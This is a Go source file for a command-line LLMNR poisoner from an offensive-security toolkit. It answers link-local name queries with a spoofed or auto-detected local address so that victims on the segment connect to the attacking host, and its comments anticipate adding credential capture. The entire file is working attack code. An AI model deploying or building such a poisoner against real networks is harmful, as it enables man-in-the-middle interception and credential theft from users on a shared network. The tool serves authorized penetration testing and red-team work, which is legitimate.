// Command poisoner runs a link-local name-resolution poisoner.
//
// A poisoner answers name-resolution queries broadcast on the local link for
// names it does not own, handing back an attacker-chosen (or auto-detected
// local) address so a victim on the segment connects to this host instead of
// the intended one. This entrypoint currently drives the LLMNR responder
// (RFC 4795); it is structured so sibling link-local name protocols (e.g. NBT-NS
// under network/netbios/nbns) and downstream credential capture can be wired in
// later without reshaping the command.
package main

import (
	"fmt"
	"net"
	"os"
	"regexp"
	"strings"
	"sync"

	"github.com/TheManticoreProject/Manticore/logger"
	"github.com/TheManticoreProject/Manticore/network/llmnr/server"
	"github.com/TheManticoreProject/goopts/parser"
)

var (
	// General
	debug   bool
	verbose bool

	// Interface / addresses
	ifaceName string
	spoofIPv4 string
	spoofIPv6 string
	noIPv4    bool
	noIPv6    bool

	// Name filtering
	answerAll     bool
	spoofNames    []string
	spoofRegex    string
	answerOwnName bool
)

func parseArgs() {
	ap := parser.ArgumentsParser{
		Banner: "poisoner - by Remi GASCOU (Podalirius) @ TheManticoreProject - v1.0.0",
	}

	ap.NewBoolArgument(&debug, "", "--debug", false, "Enable debug mode.")
	ap.NewBoolArgument(&verbose, "-v", "--verbose", false, "Log every poisoned query.")

	groupNetwork, err := ap.NewArgumentGroup("Network")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		groupNetwork.NewStringArgument(&ifaceName, "-i", "--interface", "", false, "Network interface to poison on (default: first non-loopback interface).")
		groupNetwork.NewStringArgument(&spoofIPv4, "-4", "--spoof-ipv4", "", false, "IPv4 address to answer with (default: the interface's IPv4 address).")
		groupNetwork.NewStringArgument(&spoofIPv6, "-6", "--spoof-ipv6", "", false, "IPv6 address to answer with (default: the interface's IPv6 address).")
		groupNetwork.NewBoolArgument(&noIPv4, "", "--no-ipv4", false, "Do not answer A (IPv4) queries.")
		groupNetwork.NewBoolArgument(&noIPv6, "", "--no-ipv6", false, "Do not answer AAAA (IPv6) queries.")
	}

	groupFilter, err := ap.NewArgumentGroup("Name filtering")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		groupFilter.NewBoolArgument(&answerAll, "-a", "--all", false, "Answer every queried name (aggressive; default when no --name/--regex is given).")
		groupFilter.NewListOfStringsArgument(&spoofNames, "-n", "--name", []string{}, false, "Only answer this exact name (case-insensitive); may be repeated.")
		groupFilter.NewStringArgument(&spoofRegex, "-r", "--regex", "", false, "Only answer names matching this regular expression.")
		groupFilter.NewBoolArgument(&answerOwnName, "", "--answer-own-name", false, "Also answer queries for this host's own hostname (suppressed by default).")
	}

	ap.Parse()
}

func main() {
	parseArgs()

	if debug {
		logger.SetLevel(logger.LevelDebug)
	}

	// Resolve the address(es) to hand out: an explicit --spoof-ipv4/-ipv6 wins,
	// otherwise auto-detect from the selected interface so the victim connects
	// back to this host.
	autoV4, autoV6, err := server.InterfaceAddresses(ifaceName)
	if err != nil && spoofIPv4 == "" && spoofIPv6 == "" {
		logger.Warnf("Could not auto-detect a local address: %s", err.Error())
		os.Exit(1)
	}

	cfg := server.SpoofConfig{
		AnswerA:             !noIPv4,
		AnswerAAAA:          !noIPv6,
		SuppressOwnHostname: !answerOwnName,
		OwnHostname:         localHostname(),
		Verbose:             verbose || debug,
	}

	if !noIPv4 {
		if spoofIPv4 != "" {
			cfg.SpoofIPv4 = net.ParseIP(spoofIPv4)
			if cfg.SpoofIPv4.To4() == nil {
				logger.Warnf("Invalid --spoof-ipv4 value: %q", spoofIPv4)
				os.Exit(1)
			}
		} else {
			cfg.SpoofIPv4 = autoV4
		}
	}
	if !noIPv6 {
		if spoofIPv6 != "" {
			cfg.SpoofIPv6 = net.ParseIP(spoofIPv6)
			if cfg.SpoofIPv6 == nil {
				logger.Warnf("Invalid --spoof-ipv6 value: %q", spoofIPv6)
				os.Exit(1)
			}
		} else {
			cfg.SpoofIPv6 = autoV6
		}
	}

	// Select the name-matching mode from the mutually-informative flags: an
	// allowlist and a regex are the two selective modes; anything else answers
	// every name.
	switch {
	case len(spoofNames) > 0:
		cfg.Mode = server.MatchList
		cfg.Names = spoofNames
	case spoofRegex != "":
		re, err := regexp.Compile("(?i)" + spoofRegex)
		if err != nil {
			logger.Warnf("Invalid --regex value: %s", err.Error())
			os.Exit(1)
		}
		cfg.Mode = server.MatchRegex
		cfg.Regex = re
	default:
		cfg.Mode = server.MatchAll
	}

	handler, err := server.NewSpoofHandler(cfg)
	if err != nil {
		logger.Warnf("Could not build poisoning handler: %s", err.Error())
		os.Exit(1)
	}

	var iface *net.Interface
	if ifaceName != "" {
		iface, err = net.InterfaceByName(ifaceName)
		if err != nil {
			logger.Warnf("Interface %q: %s", ifaceName, err.Error())
			os.Exit(1)
		}
	}

	logger.Infof("Starting LLMNR poisoner%s", describeTargets(cfg, ifaceName))

	// Run the IPv4 and IPv6 LLMNR responders concurrently so a single invocation
	// poisons both families. A failure to bind one family (e.g. no IPv6 on the
	// link) is logged rather than fatal, so the other family keeps working.
	var wg sync.WaitGroup
	runLLMNR(&wg, "udp4", iface, handler, debug)
	runLLMNR(&wg, "udp6", iface, handler, debug)
	wg.Wait()
}

// runLLMNR starts one LLMNR responder (IPv4 or IPv6) with the poisoning handler
// registered, in its own goroutine tracked by wg.
func runLLMNR(wg *sync.WaitGroup, network string, iface *net.Interface, handler server.Handler, debug bool) {
	var (
		srv *server.Server
		err error
	)
	switch network {
	case "udp4":
		srv, err = server.NewIPv4ServerWithHandlers([]server.Handler{handler})
	case "udp6":
		srv, err = server.NewIPv6ServerWithHandlers([]server.Handler{handler})
	default:
		return
	}
	if err != nil {
		logger.Warnf("Failed to create %s LLMNR responder: %s", network, err.Error())
		return
	}
	srv.Interface = iface
	srv.SetDebug(debug)

	wg.Add(1)
	go func() {
		defer wg.Done()
		if err := srv.ListenAndServe(); err != nil {
			logger.Warnf("%s LLMNR responder stopped: %s", network, err.Error())
		}
	}()
}

// localHostname returns the host's single-label name (the label a peer would
// query over LLMNR), lowercased, or "" when it cannot be determined.
func localHostname() string {
	h, err := os.Hostname()
	if err != nil {
		return ""
	}
	if i := strings.IndexByte(h, '.'); i >= 0 {
		h = h[:i]
	}
	return strings.ToLower(h)
}

// describeTargets renders a short human summary of what the poisoner will answer
// with, for the startup banner.
func describeTargets(cfg server.SpoofConfig, ifaceName string) string {
	parts := []string{}
	if ifaceName != "" {
		parts = append(parts, fmt.Sprintf("on %s", ifaceName))
	}
	if cfg.SpoofIPv4 != nil {
		parts = append(parts, fmt.Sprintf("A -> %s", cfg.SpoofIPv4))
	}
	if cfg.SpoofIPv6 != nil {
		parts = append(parts, fmt.Sprintf("AAAA -> %s", cfg.SpoofIPv6))
	}
	if len(parts) == 0 {
		return ""
	}
	return " (" + strings.Join(parts, ", ") + ")"
}
